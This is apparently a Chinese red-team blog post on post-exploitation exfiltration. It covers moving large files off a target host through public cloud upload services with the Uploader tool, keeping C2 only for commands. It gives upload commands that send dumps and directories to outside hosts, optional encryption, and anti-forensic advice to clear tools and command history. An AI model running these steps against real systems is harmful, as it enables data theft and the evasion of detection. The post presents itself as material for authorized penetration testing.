---
title: "C2 大文件传输：通过云上传拆分数据通道"
date: 2026-07-16T23:16:00+08:00
draft: false
description: "将大文件传输从 C2 控制通道拆分到云上传服务，并使用 Uploader 完成渠道探测、大小预检、打包、加密和故障切换。"
categories: ["安全"]
tags: ["red-team", "c2", "post-exploitation", "uploader", "file-transfer"]
featuredImage: "/images/posts/c2-large-file-exfil-via-cloud-upload/featured.jpg"
featuredImagePreview: "/images/posts/c2-large-file-exfil-via-cloud-upload/featured.jpg"
lightgallery: true
toc:
  enable: true
  auto: true
---

C2 适合命令控制和轻量交互，不适合持续传输大文件。授权测试中可将数据流量拆分到临时云上传服务，C2 仅负责下发命令和回传下载链接。

<!--more-->

{{< admonition warning "合规声明" >}}
仅供授权渗透测试与研究使用。请勿用于未授权系统。
{{< /admonition >}}

## 1. 为什么拆分数据通道

直接通过 C2 下载大文件有四类问题：

- **带宽占用**：批量传输会阻塞命令交互和心跳。
- **可靠性**：sleep、jitter、超时和较弱的断点续传能力会增加重传成本。
- **链路开销**：编码、分片、pivot、SOCKS 和多级跳板会增加流量、延迟和失败点。
- **基础设施暴露**：持续的大流量会集中指向 C2 服务端，并影响共用 Team Server 的其他会话。

拆分后的流程如下：

1. 在目标上整理好文件或目录
2. 由目标主机上传到当前网络可访问的临时存储服务
3. C2 回传下载链接
4. 测试人员从独立环境下载文件

控制流量继续走 C2，大文件流量走「目标 → 上传服务」。

## 2. Uploader 的处理流程

[Uploader](https://github.com/simonlee-hello/uploader) 基于 [Mikubill/transfer](https://github.com/Mikubill/transfer) 的多后端思路实现，主要能力如下：

- `backends`：列出后端、大小限制、状态和 URL。
- `probe`：检查当前网络中的可达性和延迟。
- 自动模式：按文件大小过滤后端，探测后按延迟尝试，失败后切换后端。
- 大小预检：上传前检查文件或目录估算大小是否超过后端限制。
- 目录处理：默认使用 Deflate 生成临时 ZIP，上传结束后删除；`-r` 改为逐文件上传。
- 加密：`-e -k` 使用 AES-256-CBC，文件格式为 `UP01` 文件头、随机 IV 和密文。
- 脚本输出：`-q` 仅向标准输出写入成功链接，错误写入标准错误。

后端状态会随服务和网络变化，执行时应以 `uploader probe` 的结果为准。

## 3. 命令示例

{{< image src="/images/posts/c2-large-file-exfil-via-cloud-upload/uploader-demo.gif" caption="Uploader 演示：backends / probe / 上传 / 安静模式 / 加密" >}}

```bash
uploader -q ./evidence
```

不指定 `-b` 时执行：大小过滤 → 探测 → 按延迟排序 → 失败切换。目录会先打包；成功时输出一行下载链接。

```bash
# 固定使用 lit
uploader -q -b lit ./dump.zip

# 优先使用 lit，失败时允许切换
uploader -q -b lit -auto ./dump.zip

# 逐文件上传目录
uploader -q -r ./dir

# 加密后上传
uploader -q -e -k 'your-key' ./secret.bin
```

查看和探测后端：

```bash
uploader backends
uploader probe
uploader probe temp lit gof -timeout 20
```

退出码：`0` 表示成功，`1` 表示上传或配置失败，`2` 表示参数错误。`-keep` 会等待键盘输入，不适用于无头执行。

## 4. 使用限制与检查项

1. 先确认目标出口、代理、白名单和 TLS 检查策略，再用小文件验证链路。
2. 公共上传服务可能记录来源、扫描内容并限制文件类型、容量和保存时间；使用前应确认项目合规要求。
3. 目录模式会在磁盘生成临时 ZIP；如不允许落地，使用 `-r` 或改用其他传输方案。
4. AES-256-CBC 只解决传输内容的保密性，不应替代文件完整性校验和密钥管理。
5. 文件名也可能泄露信息，应使用不包含业务含义的名称。
6. 下载完成后清理临时文件、工具和命令历史，并在链接失效前取回数据。
